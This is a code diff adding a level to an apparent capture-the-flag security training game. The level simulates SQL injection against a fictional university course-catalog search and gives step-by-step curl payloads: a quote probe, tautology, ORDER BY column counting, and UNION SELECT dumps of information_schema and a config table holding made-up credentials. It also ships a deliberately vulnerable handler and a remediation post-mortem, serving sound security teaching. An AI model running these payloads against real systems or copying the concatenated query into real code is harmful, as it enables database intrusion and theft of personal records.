@@ -1313,4 +1313,572 @@ Return to the lobby:    ssh guest@d3cyph3r
     },
   },
 
+  // ── level 2 — "Meridian's catalog search" (SQLi) ─────────────────
+  // Day three at Meridian State University. The level1 transcript IDOR
+  // closed the same afternoon; Carlos handed over the portal-svc
+  // credential recovered from the BluePier demo account and pointed the
+  // audit at one more piece of BluePier's 2021 work: the public
+  // course-catalog search at catalog.meridian.edu. The handler glues the
+  // `q` query parameter straight into a SQL string (CWE-89). The player
+  // probes with a single quote (verbose MySQL error — CWE-209 bonus +
+  // the constructed query leaked back), confirms with a tautology, counts
+  // columns with ORDER BY / UNION SELECT NULL, fingerprints via
+  // @@version/user()/database(), enumerates information_schema, and dumps
+  // the app_config table to recover the plaintext `meridian_dbadmin`
+  // credential — the level3 breadcrumb. The same injection reaches the
+  // FERPA-protected `students` table because BluePier pointed the public
+  // catalog at the student portal's database with an over-privileged
+  // account. Lesson stack: CWE-89 (SQLi) + OWASP A05:2025 Injection, with
+  // CWE-209 (verbose errors), CWE-312/522 (plaintext credential), CWE-250
+  // (least privilege), and FERPA (34 CFR Part 99).
+  //
+  // ENGINE: uses the v1.28.0 `level.sqli` endpoint, executed for real by
+  // js/commands/sqli.js — curl substitutes the raw `q` value into the
+  // template and runs the resulting query, so ANY valid injection payload
+  // behaves like a real vulnerable MySQL endpoint (not a pre-baked URL
+  // map). The breadcrumb lives in app_config and is reached through the
+  // UNION, never via a flat file.
+  "level2@web": {
+    password: "meridian-portal-svc-2026",
+    track: "web",
+    title: "Meridian's catalog search (SQLi)",
+    estimatedMinutes: 22,
+    playerUser: "portal-svc",
+    objective: "Audit Meridian's public course-catalog search at catalog.meridian.edu for SQL injection. Confirm whether the search box prospective students use can be turned into a query against the rest of the database — and document the blast radius if it can.",
+    lesson: "Day three at Meridian. The level1 transcript IDOR closed the same afternoon — Carlos shipped the one-line ownership check and decommissioned the BluePier demo account. While cleaning up he recovered the portal-svc service credential BluePier had stashed in that demo account and, on a hunch, checked the catalog webapp host — the same key was in its authorized_keys. So you're on catalog.meridian.edu as `portal-svc` now (BluePier reused one service account across hosts; flag it as its own finding). Today's target is the public course-catalog search BluePier wrote in 2021 and Carlos never rewrote — the box prospective students use to browse courses, no login required by design. The search term goes straight into a SQL string. Read welcome.md first, then priya-note.md for the rules of engagement, then read catalog-search.js and exercise the live endpoint with curl. Priya — general counsel cc'd again — wants to know exactly how far that search box reaches.",
+
+    // v1.10.0 BONUS FINDS — both surface real-world anti-patterns that
+    // ride alongside the injection. Orthogonal to the credential chain.
+    bonusFinds: [
+      {
+        id:   "verbose-sql-errors",
+        name: "Verbose database errors in production",
+        hint: "The catalog endpoint returns the raw database error AND the exact SQL it tried to run (CWE-209). That single 500 response hands an attacker the backend (MySQL), the query shape, and the column names — turning blind trial-and-error into a guided exercise. Error detail belongs in server logs, never in an HTTP response to a client.",
+        trigger: { command: "curl", outputContains: "Database query failed" },
+      },
+      {
+        id:   "no-waf-no-ratelimit",
+        name: "Public endpoint with no WAF and no rate limiting",
+        hint: "deploy-notes.md shows catalog.meridian.edu was stood up on a separate origin that BluePier never put behind the Cloudflare WAF — so there is no WAF and no rate limiting in front of /api/search. A WAF doesn't fix injection (parameterizing does), but its absence means automated tooling like sqlmap can hammer the endpoint — and the database directly — unthrottled.",
+        trigger: { command: "cat", argMatches: /deploy-notes/, outputContains: "no WAF and no rate limiting" },
+      },
+    ],
+
+    // v1.28.0 VULNERABLE ENDPOINT — see js/commands/sqli.js for the full
+    // endpoint shape + supported SQL grammar. The `{INJECT}` marker in
+    // `template` is where the raw `q` value is concatenated.
+    sqli: {
+      "https://catalog.meridian.edu/api/search": {
+        param: "q",
+        template: "SELECT sku, title, dept, credits FROM courses WHERE title LIKE '%{INJECT}%'",
+        columns: ["sku", "title", "dept", "credits"],
+        dbVersion: "5.7.38-0ubuntu0.18.04.1",
+        dbUser: "meridian_app@localhost",
+        dbName: "meridian_portal",
+        tables: {
+          // The table the search is SUPPOSED to read.
+          courses: {
+            columns: ["sku", "title", "dept", "credits"],
+            rows: [
+              { sku: "BIO-101",  title: "Introduction to Biology",   dept: "Biology",          credits: 4 },
+              { sku: "BIO-310",  title: "Cell Biology",              dept: "Biology",          credits: 3 },
+              { sku: "CS-201",   title: "Data Structures",           dept: "Computer Science", credits: 4 },
+              { sku: "CS-301",   title: "Algorithms",                dept: "Computer Science", credits: 4 },
+              { sku: "CS-340",   title: "Operating Systems",         dept: "Computer Science", credits: 3 },
+              { sku: "ENGL-202", title: "Advanced Composition",      dept: "English",          credits: 3 },
+              { sku: "MATH-220", title: "Linear Algebra",            dept: "Mathematics",      credits: 4 },
+              { sku: "HIST-115", title: "Pacific Northwest History", dept: "History",          credits: 3 },
+            ],
+          },
+          // FERPA-protected records — reachable through the injection
+          // because the public catalog shares the portal's database. Names
+          // continue from level0's students_export_2023.csv.
+          students: {
+            columns: ["student_id", "full_name", "email", "gpa"],
+            rows: [
+              { student_id: "M-1872941", full_name: "Aisha Patel",  email: "patel.a@meridian.edu",  gpa: 3.91 },
+              { student_id: "M-1872995", full_name: "Marcus Reyes", email: "reyes.m@meridian.edu",  gpa: 3.42 },
+              { student_id: "M-1873041", full_name: "Jordan Smith", email: "smith.j@meridian.edu",  gpa: 2.88 },
+              { student_id: "M-1873100", full_name: "Linh Tran",    email: "tran.l@meridian.edu",   gpa: 3.76 },
+              { student_id: "M-1873198", full_name: "Sara Kapoor",  email: "kapoor.s@meridian.edu", gpa: 3.94 },
+              { student_id: "M-1873244", full_name: "Olivia Chen",  email: "chen.o@meridian.edu",   gpa: 3.88 },
+            ],
+          },
+          // Staff auth table — passwords are bcrypt-hashed here (the
+          // contrast with app_config below: at least these aren't
+          // plaintext). Cracking is out of scope for this level.
+          staff_users: {
+            columns: ["username", "password_hash", "role", "email"],
+            rows: [
+              { username: "carlos",       password_hash: "$2b$12$Jq8x0Xn3eL5kP2rT9vH1Qu4bW7cR0aS6dF8gH2jK4mN6pQ8sU0wY", role: "developer", email: "carlos@meridian.edu" },
+              { username: "pwheeler",     password_hash: "$2b$12$5fD2aB7cE9gH1jK3mN5pQ7sT9vX1zA3cE5gH7jK9mN1pQ3sT5vX7", role: "registrar", email: "wheeler.p@meridian.edu" },
+              { username: "bluepier_svc", password_hash: "$2b$12$1aB3cD5eF7gH9iJ1kL3mN5oP7qR9sT1uV3wX5yZ7aB9cD1eF3gH5", role: "admin",     email: "ops@bluepier.example" },
+            ],
+          },
+          // The application's own configuration — credentials and secrets
+          // stored, badly, in a database table. The db.admin.* pair is the
+          // prize: the database superuser credential, in plaintext.
+          app_config: {
+            columns: ["config_key", "config_value"],
+            rows: [
+              { config_key: "app.name",          config_value: "Meridian Course Catalog" },
+              { config_key: "smtp.host",         config_value: "smtp.meridian.edu" },
+              { config_key: "smtp.user",         config_value: "noreply@meridian.edu" },
+              { config_key: "session.secret",    config_value: "kg9F2pX7qZ1mW4dR6tY8-rotate-me" },
+              { config_key: "db.host",           config_value: "db.meridian.edu" },
+              { config_key: "db.admin.user",     config_value: "meridian_dbadmin" },
+              { config_key: "db.admin.password", config_value: "M3rid14n-DBr00t!2026" },
+              { config_key: "recaptcha.secret",  config_value: "6Lc2k9wpAAAAAB-meridian-prod" },
+            ],
+          },
+        },
+      },
+    },
+
+    // curl -I against the bare endpoint returns these (the X-Powered-By
+    // header is itself a small fingerprinting leak).
+    webHeaders: {
+      "https://catalog.meridian.edu/api/search": {
+        "HTTP/1.1": "200 OK",
+        "Server": "nginx/1.14.0 (Ubuntu)",
+        "Content-Type": "application/json; charset=utf-8",
+        "X-Powered-By": "Express",
+      },
+    },
+
+    fs: {
+      type: "dir",
+      children: {
+
+        "welcome.md": {
+          type: "file",
+          content:
+`─── Meridian Course Catalog / catalog.meridian.edu (portal-svc) ──
+
+Day three at Meridian. Yesterday's transcript IDOR (level1) closed the
+same afternoon — Carlos added the ownership check and deleted the
+BluePier demo account. While he was in there he found the service
+credential BluePier had stashed (portal-svc) and, on a hunch, checked
+the catalog webapp host. The same key was in that host's
+authorized_keys. So you're now logged in as \`portal-svc\` on
+catalog.meridian.edu — a service account BluePier reused across hosts
+(flag that; it's a finding on its own).
+
+Today's target is the public course-catalog search — the box
+prospective students use to browse Meridian's course list. No login
+required; that's intentional and fine. What's NOT fine is what BluePier
+did with the search term once it reaches the server.
+
+
+─── COMMANDS YOU'LL USE TODAY ─────────────────────────────────
+
+  curl <url>      Fetch a URL and print the response body. Quote the
+                  WHOLE url so your shell doesn't eat the spaces and
+                  quotes in an injection payload:
+                      curl "https://host/api/search?q=PAYLOAD"
+
+(No new commands. SQL injection is a TECHNIQUE you apply with curl, not
+a tool you install. That's the point.)
+
+
+─── WHAT SQL INJECTION IS ─────────────────────────────────────
+
+A web app turns your input into a database query. The safe way passes
+your input as a PARAMETER, kept separate from the query's code:
+
+    SELECT ... FROM courses WHERE title LIKE ?      <- value bound here
+
+The unsafe way GLUES your input into the query string:
+
+    "SELECT ... FROM courses WHERE title LIKE '%" + q + "%'"
+
+When the app glues, your input is no longer just a value — it becomes
+part of the query's CODE. A single quote (') ends the string literal
+early and drops you into raw SQL. From there you can:
+
+  - rewrite the WHERE so it matches everything     (' OR 1=1 )
+  - bolt a second query onto the first             ( UNION SELECT ... )
+  - read tables the search was never meant to touch
+    (other students' records, the app's own credentials)
+
+The catalog search only ever intended to read the \`courses\` table. You
+are going to make it read the whole database.
+
+
+─── HOW TO PLAY ───────────────────────────────────────────────
+
+  1.  cat priya-note.md            Rules of engagement (read FIRST).
+  2.  cat catalog-search.js        The handler BluePier shipped. Find
+                                   the line that glues \`q\` into the SQL.
+  3.  cat deploy-notes.md          How the catalog stack is deployed.
+
+  Now exercise the endpoint. Quote every url.
+
+  4.  Normal search — see what it's supposed to do:
+        curl "https://catalog.meridian.edu/api/search?q=biology"
+
+  5.  Probe with a single quote — break the SQL on purpose:
+        curl "https://catalog.meridian.edu/api/search?q='"
+      Read the error. The server hands you the database's complaint AND
+      the exact query it tried to run. That's two findings in one.
+
+  6.  Confirm the injection — make the WHERE always true:
+        curl "https://catalog.meridian.edu/api/search?q=' OR 1=1-- -"
+      Every course comes back. (\`-- -\` is a SQL comment that throws
+      away the rest of BluePier's query; the trailing dash makes the
+      space required after \`--\` visible.)
+
+  7.  Count the columns — a UNION must match. Walk ORDER BY up until it
+      errors, and you know the count:
+        curl "https://catalog.meridian.edu/api/search?q=zzz' ORDER BY 4-- -"
+        curl "https://catalog.meridian.edu/api/search?q=zzz' ORDER BY 5-- -"
+      Four works, five errors -> four columns.
+
+  8.  Fingerprint the database through a UNION:
+        curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT @@version,user(),database(),NULL-- -"
+
+  9.  Enumerate the tables (information_schema is SQL's own catalog):
+        curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- -"
+
+  10. One table looks like configuration. List its columns, then dump it:
+        curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='app_config'-- -"
+        curl "https://catalog.meridian.edu/api/search?q=zzz' UNION SELECT config_key,config_value,NULL,NULL FROM app_config-- -"
+      What you pull out of app_config is your way into the next
+      engagement.
+
+  11. cat lessons-learned.md       Post-mortem (read after step 10).
+
+Tip: \`zzz\` is a search term that matches no course, so only your
+injected rows come back — cleaner than \` OR 1=1\` when you just want
+to read the UNION output.`
+        },
+
+        "priya-note.md": {
+          type: "file",
+          content:
+`# Meridian State University — engagement update (day three)
+
+Two findings closed in two days. Carlos is the client every consultant
+wants: he fixed the transcript IDOR within hours, decommissioned the
+BluePier demo account, and self-reported both to Cedarwood Mutual before
+I could draft the language. The renewal file now reads "discovered and
+remediated within audit window" twice.
+
+The portal-svc credential we recovered from that demo account opened
+more doors than expected. Carlos found the same key in the catalog
+webapp host's authorized_keys — BluePier wired one service account
+across multiple hosts in 2021 and nobody ever pulled it apart. That
+reuse is finding number three; note it, we'll write it up.
+
+## What I want you to check
+
+BluePier built the public course-catalog search in 2021. Carlos never
+rewrote it. He showed me the handler and admitted he "didn't love" how
+the search term gets used but hadn't had time to look closely. I want
+to know whether that search box reaches past the course list.
+
+Read catalog-search.js. Then exercise the endpoint:
+
+  - A single-quote probe, to see whether the input breaks the query.
+  - If it does: confirm with a tautology, count the columns, and use a
+    UNION to reach ONE non-course table to prove the blast radius.
+
+## Rules of engagement
+
+Same FERPA discipline as yesterday, and it matters more here because a
+working injection reaches the student records directly:
+
+  - This is AUTHORIZED testing. Carlos and Meridian's GC signed off.
+  - PROVE the vulnerability; do not harvest. Pull enough rows to
+    demonstrate reach — a handful — and stop. Do NOT dump the full
+    students table. "I extracted 30,000 student records to prove a
+    point" is not a sentence that survives a deposition.
+  - The cleanest proof is the app's OWN secrets (the config table): it
+    shows an attacker could seize the whole database without touching a
+    single student record first. Lead the writeup with that.
+
+## Compliance angle
+
+A SQL injection on a public, UNAUTHENTICATED endpoint that shares a
+database with the student-records system is the worst of the three
+findings. No login, no IDOR-style session needed — just a url. Under
+FERPA (34 CFR Part 99) every student record reachable this way is an
+unauthorized-disclosure risk, and the federal-funding exposure is the
+same as days one and two. Cedarwood needs this today.
+
+— Priya
+  2026-04-10, 9:15am`
+        },
+
+        "catalog-search.js": {
+          type: "file",
+          content:
+`// Meridian Course Catalog — public search endpoint
+// Author: BluePier Digital (J. Reynard), 2021
+// "Inherited as-is." — Carlos, 2026
+//
+// Mounted at catalog.meridian.edu/api/search. No auth: the course
+// catalog is public information, so anyone can search it. That part is
+// fine. The problem is the line marked below.
+
+import express from "express";
+import { db } from "./db.js";   // connects as meridian_app, which has
+                                // read/write on the WHOLE meridian_portal
+                                // schema (see deploy-notes.md)
+
+export const router = express.Router();
+
+router.get("/api/search", async (req, res) => {
+  const q = req.query.q || "";
+
+  // BluePier built the query by gluing the search term straight into the
+  // SQL string. The term is NOT escaped or bound as a parameter.
+  //   >>>  this is the vulnerability  <<<
+  const sql =
+    "SELECT sku, title, dept, credits FROM courses " +
+    "WHERE title LIKE '%" + q + "%'";
+
+  try {
+    const rows = await db.query(sql);
+    return res.json({ results: rows, count: rows.length });
+  } catch (err) {
+    // TODO(carlos): stop returning the raw DB error + query in prod.
+    // BluePier left this in to "make debugging easier." It makes
+    // ATTACKING easier — it hands the caller the exact query and the
+    // database's identity for free.
+    return res.status(500).json({
+      status:  "error",
+      message: "Database query failed",
+      error:   err.message,
+      query:   sql,
+    });
+  }
+});
+
+// The fix is one line: bind the parameter instead of gluing it.
+//
+//   const sql = "SELECT sku, title, dept, credits FROM courses " +
+//               "WHERE title LIKE ?";
+//   const rows = await db.query(sql, ['%' + q + '%']);
+//
+// Bound parameters are treated as VALUES no matter what characters they
+// contain. A quote stays a quote; it can never become syntax.`
+        },
+
+        "deploy-notes.md": {
+          type: "file",
+          content:
+`# Meridian Course Catalog — deployment notes
+# BluePier Digital, 2021. Annotated by Carlos, 2026.
+
+Host:        catalog.meridian.edu  (Ubuntu 18.04, BluePier-provisioned)
+Stack:       Node 16 + Express, behind nginx
+Database:    db.meridian.edu / schema \`meridian_portal\`
+             ** SAME database as the student portal. ** The catalog app
+             connects as \`meridian_app\`, which BluePier granted
+             read/write on the ENTIRE schema — including students,
+             staff_users, and app_config.
+             (Carlos: "why does the public catalog need write access to
+             the transcripts table? it doesn't.")
+
+Front door:  www.meridian.edu sits behind the Cloudflare WAF. The
+             catalog subdomain does NOT — BluePier stood it up on a
+             separate origin and never put it behind the WAF. So there
+             is no WAF and no rate limiting on this endpoint: requests
+             to /api/search hit the application — and the database —
+             directly, as fast as a client can send them.
+
+MySQL:       5.7.38. (Carlos: "I keep meaning to upgrade. 5.7 went
+             end-of-life October 2023 — no more security patches.")
+
+TODO (Carlos, never got to):
+  - parameterize the catalog search query
+  - give the catalog a READ-ONLY db user scoped to \`courses\`
+  - put catalog.meridian.edu behind the WAF + add rate limiting
+  - stop returning raw DB errors to clients
+  - move the db.admin credential out of app_config into a secrets manager
+  - upgrade off MySQL 5.7`
+        },
+
+        "lessons-learned.md": {
+          type: "file",
+          content:
+`══════════════════════════════════════════════════════════════
+  POST-MORTEM — what you just found, and why it matters
+══════════════════════════════════════════════════════════════
+
+You turned a public course-search box into a query against Meridian's
+entire portal database. A single quote in the \`q\` parameter broke out
+of the string literal BluePier glued it into; a UNION SELECT let you
+append your own query to the catalog's; and information_schema told you
+every table name and column to aim at. You pulled the application's own
+configuration table — including the plaintext credential for
+\`meridian_dbadmin\`, the database's administrative account — out through
+a search box that requires no login.
+
+That credential is your entry to the next engagement. But the finding
+is bigger than one password: the same injection reaches the \`students\`
+table (FERPA-protected records) and \`staff_users\`, because BluePier
+pointed the public catalog at the SAME database as the student portal
+and gave it read/write on everything.
+
+─── THE BLUNT VERSION ────────────────────────────────────────
+
+SQL injection is what happens when an application builds a query by
+gluing untrusted input into the query STRING instead of passing it as a
+PARAMETER. Once your input lands inside the query text, it stops being
+data and becomes code. The fix has been known and easy for twenty-plus
+years — parameterized queries / prepared statements — and the bug still
+ships constantly, because gluing strings is the first thing a developer
+reaches for and it "works" in every test where nobody types a quote.
+
+BluePier's handler was one line of glue:
+
+    "...WHERE title LIKE '%" + q + "%'"
+
+Everything you did followed from that. The defense is one line too —
+bind \`q\` as a parameter and the database treats it as a value no matter
+what characters it contains:
+
+    "...WHERE title LIKE ?", ['%' + q + '%']
+
+Two failures stacked on top of the injection and made it worse:
+
+  1. VERBOSE ERRORS. The handler returned the raw database error AND the
+     exact SQL it tried to run. That handed you the backend (MySQL), the
+     query shape, and your column names for free. Error detail is for
+     your logs, not your users.
+
+  2. AN OVER-PRIVILEGED, SHARED DATABASE ACCOUNT. The public catalog
+     connects with a user that can read every table in the portal
+     schema. A read-only account scoped to \`courses\` would have made
+     the injection a non-event — you'd have broken the query and reached
+     nothing worth reaching.
+
+─── THE CONSULTING-FIRM ANGLE ────────────────────────────────
+
+This is the worst of the three Meridian findings and it should lead the
+report. Days one and two needed something: a guessed path, a captured
+session. This one needs a url. No authentication, no login, nothing —
+the catalog search is public by design, and BluePier wired it to a
+database full of FERPA records.
+
+Frame it for Carlos the way the first two landed: the fixes are small
+and he can ship them this week (parameterize the query, scope a
+read-only db user, put the subdomain behind the WAF, stop leaking
+errors, rotate the exposed \`meridian_dbadmin\` password, upgrade off
+MySQL 5.7). Frame it for Cedarwood Mutual as "discovered in audit
+window, remediation plan attached." Frame it for the general counsel as
+a FERPA matter: every student record was reachable from the open
+internet through a search box.
+
+And rotate that database credential immediately — treat it as burned the
+moment it appeared in a query response, regardless of who was watching.
+
+─── FRAMEWORKS THAT COVER THIS ───────────────────────────────
+
+  CWE-89: Improper Neutralization of Special Elements used in an SQL
+    Command ('SQL Injection'). The precise weakness. CWE-89 was #3 on
+    the CWE Top 25 Most Dangerous Software Weaknesses in BOTH 2023 and
+    2024 — two decades after the bug was first documented.
+
+  CWE-209: Generation of Error Message Containing Sensitive Information.
+    The verbose error that returned the raw query + DB version.
+
+  CWE-312 / CWE-522: Cleartext Storage of Sensitive Information /
+    Insufficiently Protected Credentials. The \`meridian_dbadmin\`
+    password sat in a database table in plaintext.
+
+  CWE-250: Execution with Unnecessary Privileges. The public catalog
+    connected as a user with read/write on the whole schema.
+
+  OWASP Top 10
+    A05:2025 — Injection. (It was A03:2021, and A1 back in the 2010s.
+    Injection slid DOWN the list not because it's solved but because
+    parameterized queries and ORMs cut its prevalence — it stays on the
+    list because the impact, when it lands, is total.)
+
+  NIST SP 800-53 Rev. 5
+    SI-10 (Information Input Validation) — validate / neutralize input
+      before it reaches an interpreter. The control for injection.
+    SI-11 (Error Handling) — reveal as little as possible in error
+      messages; the verbose error violates this directly.
+    AC-6 (Least Privilege) — the catalog's database account had far more
+      access than its function required.
+
+  CIS Critical Security Controls v8.1
+    16.11 — Leverage Vetted Modules or Services for Application Security
+      Components (use the framework's parameterized-query API; don't
+      hand-build SQL strings).
+    3.x  — Data Protection (the plaintext credential in app_config).
+
+  FERPA (20 U.S.C. § 1232g; 34 CFR Part 99)
+    §99.31 / §99.32 — the \`students\` table reachable through this
+      injection is exactly the "education records" FERPA governs;
+      unauthorized disclosure with no recordkeeping is the violation.
+
+─── WHERE THIS SHOWS UP ON CERTIFICATIONS ────────────────────
+
+  CompTIA Security+ (SY0-701) — Domain 2: injection attacks are named
+    and tested directly.
+  CompTIA PenTest+ (PT0-003) — Domain 3 (Attacks and Exploits): SQL
+    injection, UNION-based extraction, and information_schema
+    enumeration are all in scope.
+  CompTIA CySA+ (CS0-003 / CS0-004) — CS0-004 launched early 2026 for
+    parallel availability; CS0-003 retires June 2026. Injection
+    detection patterns appear in the threat-hunting modules.
+  ISC2 CISSP — Domain 8 (Software Development Security): input
+    validation and parameterized queries are fundamentals.
+  Offensive Security OSWA / OSWE / OSCP — SQL injection is a core skill;
+    OSWA (Web Assessor) and OSWE test exactly this hand-built
+    UNION-extraction workflow that sqlmap automates.
+
+─── MITRE ATT&CK MAPPING ─────────────────────────────────────
+
+  T1190     — Exploit Public-Facing Application. The injection itself.
+  T1213     — Data from Information Repositories. The portal database
+              you read through the UNION.
+  T1552     — Unsecured Credentials. The plaintext DB credential in the
+              app_config table.
+  T1078     — Valid Accounts. What an attacker does next with the
+              \`meridian_dbadmin\` credential you extracted.
+
+─── WHAT A DEFENDER SHOULD ACTUALLY DO ───────────────────────
+
+  1. Parameterize the query. Prepared statements / bound parameters,
+     every query, no exceptions. This closes the injection completely.
+  2. Scope the database account. Give the public catalog a read-only
+     user that can see \`courses\` and nothing else. Defense in depth: if
+     an injection ever lands again, it reaches nothing.
+  3. Stop leaking errors. Return a generic 500 to clients; log the
+     detail server-side. Never echo the query or the DB version.
+  4. Rotate the exposed credential. Treat \`meridian_dbadmin\` as burned.
+     Move it out of the database into a secrets manager; never store
+     credentials in an application table.
+  5. Put the subdomain behind the WAF and add rate limiting. A WAF is
+     not a fix for injection — parameterizing is — but it buys time and
+     catches the noisy automated scanners (sqlmap) that find these.
+  6. Upgrade off MySQL 5.7 (end-of-life October 2023; no security
+     patches since). An unpatched database under a public injection is a
+     compounding risk.
+  7. Scan for the pattern everywhere. The "glue input into SQL" shape
+     repeats; Semgrep and CodeQL both ship SQL-injection rule packs.
+     Find every query built by concatenation, not just this one.
+
+─── CLOSING THOUGHT ──────────────────────────────────────────
+
+sqlmap would have done in one command what you did by hand here. Doing
+it by hand once is why you understand what the tool is doing — the quote
+that breaks the string, the UNION that matches the column count, the
+information_schema that maps the database. The defense never changes:
+the database must treat user input as a value, never as code. One bound
+parameter would have made this whole engagement a 404.
+
+Return to the lobby:    ssh guest@d3cyph3r`
+        },
+
+      },
+    },
+  },
+
 };
